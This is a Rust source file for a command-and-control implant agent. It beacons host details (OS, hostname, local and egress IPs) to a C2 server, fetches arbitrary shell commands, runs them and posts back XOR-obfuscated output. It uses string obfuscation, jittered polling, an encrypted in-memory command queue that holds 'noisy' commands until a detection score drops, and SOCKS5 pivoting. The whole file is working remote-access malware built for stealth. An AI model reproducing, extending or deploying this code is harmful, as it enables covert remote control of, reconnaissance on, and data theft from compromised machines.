use crate::commands::obfuscated::{xor_obfuscate};
use crate::config::AgentConfig;
use crate::networking::egress::get_egress_ip;
use crate::networking::socks5_pivot::Socks5PivotHandler;
use crate::networking::socks5_pivot_server::Socks5PivotServer;
use crate::opsec::{AgentMode, determine_agent_mode};
use crate::util::{random_jitter, now_timestamp};
use get_if_addrs::get_if_addrs;
use hostname;
use log::{info, error, debug, warn};
use once_cell::sync::Lazy;
use os_info;
use reqwest::StatusCode;
use serde_json::json;
use std::collections::HashMap;
use std::env;
use std::io;
use std::path::Path;
use std::sync::Arc;
use std::time::{Duration};
use tokio::sync::Mutex as TokioMutex;
use tokio::sync::mpsc;
use tokio::task::JoinHandle;
use tokio::time::timeout;
use obfstr::obfstr;
use serde::Deserialize;

static PIVOT_SERVERS: Lazy<TokioMutex<HashMap<u16, JoinHandle<()>>>> = Lazy::new(|| TokioMutex::new(HashMap::new()));

// Define the expected structure for the command response JSON
#[derive(Deserialize)]
struct CommandResponse {
    command: String,
}

fn get_all_local_ips() -> Vec<String> {
    let mut ips = Vec::new();
    if let Ok(ifaces) = get_if_addrs() {
        for iface in ifaces {
            match iface.addr.ip() {
                std::net::IpAddr::V4(ipv4) => {
                    if !ipv4.is_loopback() && !ipv4.is_multicast() {
                        ips.push(ipv4.to_string());
                    }
                }
                std::net::IpAddr::V6(ipv6) => {
                    if !ipv6.is_loopback() && !ipv6.is_multicast() {
                        ips.push(ipv6.to_string());
                    }
                }
            }
        }
    }
    ips
}

async fn execute_command(cmd_parts: &[&str]) -> io::Result<String> {
    if cmd_parts.is_empty() {
        return Ok(String::new());
    }

    // Handle cd command specially
    if cmd_parts[0] == "cd" {
        if let Some(dir) = cmd_parts.get(1) {
            let path = Path::new(dir);
            if path.exists() {
                env::set_current_dir(path)?;
                return Ok(format!("Changed directory to {}", env::current_dir()?.display()));
            } else {
                return Err(io::Error::new(io::ErrorKind::NotFound, "Directory not found"));
            }
        }
        return Ok(format!("Current directory: {}", env::current_dir()?.display()));
    }

    // Handle other commands with timeout + spawn_blocking to avoid blocking tokio
    let (program, args): (String, Vec<String>) = if cfg!(windows) {
        (cmd_parts.join(" "), vec![])
    } else {
        (cmd_parts[0].to_string(), cmd_parts[1..].iter().map(|s| s.to_string()).collect())
    };

    let result = timeout(Duration::from_secs(30), async {
        let output = tokio::task::spawn_blocking(move || {
            if cfg!(windows) {
                std::process::Command::new("cmd")
                    .arg("/C")
                    .arg(&program)
                    .output()
            } else {
                std::process::Command::new(&program)
                    .args(&args)
                    .output()
            }
        })
        .await
        .map_err(|e| io::Error::new(io::ErrorKind::Other, format!("Task join error: {}", e)))?
        .map_err(|e| e)?;

        Ok::<_, io::Error>(format!("{}{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr)))
    }).await;

    match result {
        Ok(Ok(output)) => Ok(output),
        Ok(Err(e)) => Err(e),
        Err(_) => Err(io::Error::new(io::ErrorKind::TimedOut, "Command timed out after 30 seconds"))
    }
}

//  Update C2 failure tracking to use new accessor pattern
fn update_c2_failure_state(success: bool) {
    use crate::opsec::with_opsec_state_mut;

    with_opsec_state_mut(|state| {
        if success {
            if state.consecutive_c2_failures > 0 {
                state.consecutive_c2_failures = 0;
                info!("[OPSEC C2] C2 communication restored, reset failure counter");
            }
        } else {
            state.consecutive_c2_failures = state.consecutive_c2_failures.saturating_add(1);
            warn!("[OPSEC C2] C2 communication failed, consecutive failures: {}", state.consecutive_c2_failures);
        }
    });
}

//  Add function to mark noisy command executed
fn mark_noisy_command_executed() {
    use crate::opsec::with_opsec_state_mut;

    with_opsec_state_mut(|state| {
        state.last_noisy_command_time = Some(now_timestamp());
    });
}

// Send heartbeat to the server
pub async fn send_heartbeat_with_client(config: &AgentConfig, client: &reqwest::Client, server_addr: &str, agent_id: &str) -> io::Result<()> {
    let url = format!("{}/{}{}{}",
        server_addr,
        obfstr!("api/agent/"),
        agent_id,
        obfstr!("/heartbeat"),
    );
    info!("[HTTP] Sending heartbeat POST to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);

    let os = os_info::get();
    let hostname = hostname::get()?
        .to_string_lossy()
        .to_string();
    let ip_list = get_all_local_ips();
    let ip = if ip_list.is_empty() { "Unknown".into() } else { ip_list.join(",") };
    let egress_ip = get_egress_ip(server_addr);

    let data = json!({
        "id": agent_id,
        "os": os.os_type().to_string(),
        "hostname": hostname,
        "ip": ip,
        "ip_list": ip_list,
        "egress_ip": egress_ip,
        "commands": Vec::<String>::new()
    });

    match client.post(&url).json(&data).send().await {
        Ok(response) => {
            info!("[HTTP] Heartbeat response: {} (SOCKS5 enabled: {})", response.status(), config.socks5_enabled);
            if response.status().is_success() {
                update_c2_failure_state(true);
                Ok(())
            } else {
                error!("[HTTP] Heartbeat failed with status: {}", response.status());
                update_c2_failure_state(false);
                Err(io::Error::new(io::ErrorKind::Other, "Heartbeat failed"))
            }
        }
        Err(e) => {
            error!("[HTTP] Heartbeat POST failed: {}", e);
            update_c2_failure_state(false);
            Err(io::Error::new(io::ErrorKind::Other, e))
        }
    }
}

// Fetch command from the server
async fn get_command_with_client(client: &reqwest::Client, server_addr: &str, agent_id: &str) -> io::Result<Option<String>> {
    let url = format!("{}/{}{}{}",
        server_addr,
        obfstr!("api/agent/"),
        agent_id,
        obfstr!("/command"),
    );
    info!("[HTTP] Sending command GET to {}", url);

    match client.get(&url).send().await {
        Ok(response) => {
            info!("[HTTP] Command GET response: {}", response.status());
            if response.status() == StatusCode::NO_CONTENT {
                update_c2_failure_state(true);
                return Ok(None);
            }
            if response.status().is_success() {
                match response.json::<CommandResponse>().await {
                    Ok(cmd_resp) => {
                        update_c2_failure_state(true);
                        Ok(Some(cmd_resp.command))
                    }
                    Err(e) => {
                        error!("[HTTP] Failed to parse command response JSON: {}", e);
                        update_c2_failure_state(false);
                        Err(io::Error::new(io::ErrorKind::InvalidData, "Invalid JSON response"))
                    }
                }
            } else {
                error!("[HTTP] Command fetch failed with status: {}", response.status());
                update_c2_failure_state(false);
                Err(io::Error::new(io::ErrorKind::Other, "Command fetch failed"))
            }
        }
        Err(e) => {
            error!("[HTTP] Command GET failed: {}", e);
            update_c2_failure_state(false);
            Err(io::Error::new(io::ErrorKind::Other, e))
        }
    }
}

// Submit result to the server
async fn submit_result_with_client(
    client: &reqwest::Client,
    server_addr: &str,
    agent_id: &str,
    command: &str,
    output: &str
) -> io::Result<()> {
    let url = format!("{}/{}{}{}",
        server_addr,
        obfstr!("api/agent/"),
        agent_id,
        obfstr!("/result"),
    );
    info!("[HTTP] Sending result POST to {}", url);

    let obfuscated_output = xor_obfuscate(output, agent_id);
    let data = json!({
        "command": command,
        "output": obfuscated_output
    });

    match client.post(&url).json(&data).send().await {
        Ok(response) => {
            info!("[HTTP] Result POST response: {}", response.status());
            if response.status().is_success() {
                update_c2_failure_state(true);
                Ok(())
            } else {
                error!("[HTTP] Result submission failed with status: {}", response.status());
                update_c2_failure_state(false);
                Err(io::Error::new(io::ErrorKind::Other, "Result submission failed"))
            }
        }
        Err(e) => {
            error!("[HTTP] Result POST failed: {}", e);
            update_c2_failure_state(false);
            Err(io::Error::new(io::ErrorKind::Other, e))
        }
    }
}

fn is_weak_command(cmd: &str) -> bool {
    let quiet = [
        obfstr!("ping").to_string(),
        obfstr!("echo").to_string(),
    ];
    quiet.iter().any(|q| cmd.starts_with(q))
}

fn is_strong_command(cmd: &str) -> bool {
    let noisy = [
        obfstr!("screenshot").to_string(),
        obfstr!("scan").to_string(),
        obfstr!("upload").to_string(),
        obfstr!("download").to_string(),
        obfstr!("ls").to_string(),
        obfstr!("ps").to_string(),
        obfstr!("netstat").to_string(),
        obfstr!("ifconfig").to_string(),
        obfstr!("whoami").to_string(),
        obfstr!("uname").to_string(),
        obfstr!("cat").to_string(),
    ];
    noisy.iter().any(|n| cmd.starts_with(n))
}

// Execute a command and submit the result to C2
async fn execute_and_submit(
    client: &reqwest::Client,
    server_addr: &str,
    agent_id: &str,
    command: &str,
) {
    let cmd_parts: Vec<&str> = command.split_whitespace().collect();
    if is_strong_command(command) {
        mark_noisy_command_executed();
    }
    let output = match execute_command(&cmd_parts).await {
        Ok(output) => output,
        Err(e) => {
            error!("[SHELL] Command execution failed: {}", e);
            format!("Error: {}", e)
        }
    };
    if let Err(e) = submit_result_with_client(client, server_addr, agent_id, command, &output).await {
        error!("[SHELL] Failed to submit result: {}", e);
    }
}

// Check if the command should be queued based on the current opsec mode
fn should_queue_command(cmd: &str, mode: AgentMode) -> bool {
    debug!("[OPSEC] should_queue_command: mode={:?}, cmd={}", mode, cmd);
    match mode {
        AgentMode::FullOpsec | AgentMode::ReducedActivity => {
            info!("[OPSEC] Queueing command '{}' (mode: {:?})", cmd, mode);
            true
        }
        AgentMode::BackgroundOpsec => {
            if is_weak_command(cmd) {
                info!("[OPSEC] Weak command '{}' allowed in BackgroundOpsec", cmd);
                false
            } else {
                info!("[OPSEC] Strong command '{}' queued in BackgroundOpsec", cmd);
                true
            }
        }
    }
}

// Main function to run the shell
pub async fn agent_loop(
    server_addr: &str,
    agent_id: &str,
    _pivot_handler: Arc<TokioMutex<Socks5PivotHandler>>,
    _pivot_tx: mpsc::Sender<crate::networking::socks5_pivot::PivotFrame>,
) -> Result<(), Box<dyn std::error::Error>> {
    let config = AgentConfig::load()?;
    let client = config.build_http_client()?;
    info!("[SHELL] Entering agent_loop (BackgroundOpsec Active)");

    // Initial heartbeat for this active period
    let initial_heartbeat_result = send_heartbeat_with_client(&config, &client, server_addr, agent_id).await;
    if let Err(e) = initial_heartbeat_result {
        error!("[SHELL] Initial heartbeat failed: {}. Returning to main loop for OPSEC re-assessment.", e);
    }

    loop {
        // Determine current OPSEC mode *before* acting
        let current_mode = determine_agent_mode(&config);

        // If no longer in BackgroundOpsec, exit agent_loop immediately
        if current_mode != AgentMode::BackgroundOpsec {
            info!("[SHELL] Mode changed to {:?}, exiting agent_loop", current_mode);
            break;
        }

        // Still in BackgroundOpsec, proceed with C2 communication
        let sleep_time = random_jitter(config.sleep_interval, config.jitter);
        info!("[SHELL] Polling for commands (Interval: {}s)", sleep_time);

        match get_command_with_client(&client, server_addr, agent_id).await {
            Ok(Some(command)) => {
                info!("[SHELL] Received command: {}", command);

                // Check if we should queue this command or execute immediately
                if should_queue_command(&command, current_mode) {
                    // Queue the command using encrypted in-memory storage
                    match crate::safe_mutex::safe_lock(&crate::state::MEMORY_PROTECTOR) {
                        Ok(mut protector) => {
                            match protector.add_command(command.as_bytes()) {
                                Ok(()) => {
                                    let queue_len = protector.command_queue_len();
                                    info!("[OPSEC] Command queued (encrypted, total: {})", queue_len);
                                }
                                Err(e) => {
                                    error!("[OPSEC] Failed to encrypt-queue command: {}", e);
                                }
                            }
                        }
                        Err(e) => {
                            error!("[OPSEC] Failed to lock MEMORY_PROTECTOR for queue: {}", e);
                        }
                    }
                } else {
                    // Execute immediately (only weak commands in BackgroundOpsec)
                    info!("[SHELL] Executing weak command immediately: {}", command);
                    execute_and_submit(&client, server_addr, agent_id, &command).await;
                }
            }
            Ok(None) => {
                debug!("[SHELL] No command available");
            }
            Err(e) => {
                error!("[SHELL] Failed to get command: {}", e);
            }
        }

        // --- Process ONE Queued Command (only when opsec score is safely low) ---
        let score = crate::opsec::with_opsec_state(|s| s.current_score);
        let safe_threshold = config.base_score_threshold_bg_to_reduced / 2.0;
        if score < safe_threshold {
            let maybe_cmd = match crate::safe_mutex::safe_lock(&crate::state::MEMORY_PROTECTOR) {
                Ok(mut protector) => {
                    match protector.pop_command() {
                        Ok(Some(bytes)) => String::from_utf8(bytes).ok(),
                        Ok(None) => None,
                        Err(e) => {
                            error!("[SHELL] Failed to pop encrypted command: {}", e);
                            None
                        }
                    }
                }
                Err(e) => {
                    error!("[SHELL] Failed to lock MEMORY_PROTECTOR for dequeue: {}", e);
                    None
                }
            };
            if let Some(command) = maybe_cmd {
                info!("[SHELL] Processing queued command (score: {:.1}, threshold: {:.1})", score, safe_threshold);
                execute_and_submit(&client, server_addr, agent_id, &command).await;
            }
        } else {
            let queue_len = crate::safe_mutex::safe_lock(&crate::state::MEMORY_PROTECTOR)
                .map(|p| p.command_queue_len())
                .unwrap_or(0);
            if queue_len > 0 {
                debug!("[SHELL] {} queued command(s) waiting (score: {:.1}, need < {:.1})", queue_len, score, safe_threshold);
            }
        }

        // Sleep before next poll
        debug!("[SHELL] Sleeping for {} seconds...", sleep_time);
        tokio::time::sleep(Duration::from_secs(sleep_time)).await;
    }

    Ok(())
}

#[allow(dead_code)] // Intended for future pivot management commands
async fn start_pivot_server(
    port: u16,
    pivot_handler: Arc<TokioMutex<Socks5PivotHandler>>,
    pivot_tx: mpsc::Sender<crate::networking::socks5_pivot::PivotFrame>,
) -> Result<String, String> {
    let mut servers = PIVOT_SERVERS.lock().await;
    if servers.contains_key(&port) {
        return Err(format!("Pivot server already running on port {}", port));
    }
    let server = Socks5PivotServer::new("127.0.0.1".to_string(), port, pivot_tx);
    let handler = pivot_handler.clone();
    let handle = tokio::spawn(async move {
        server.run(handler).await;
    });
    servers.insert(port, handle);
    Ok(format!("Started pivot server on port {}", port))
}

#[allow(dead_code)] // Intended for future pivot management commands
async fn stop_pivot_server(port: u16) -> Result<String, String> {
    let mut servers = PIVOT_SERVERS.lock().await;
    if let Some(handle) = servers.remove(&port) {
        handle.abort();
        Ok(format!("Stopped pivot server on port {}", port))
    } else {
        Err(format!("No pivot server running on port {}", port))
    }
}
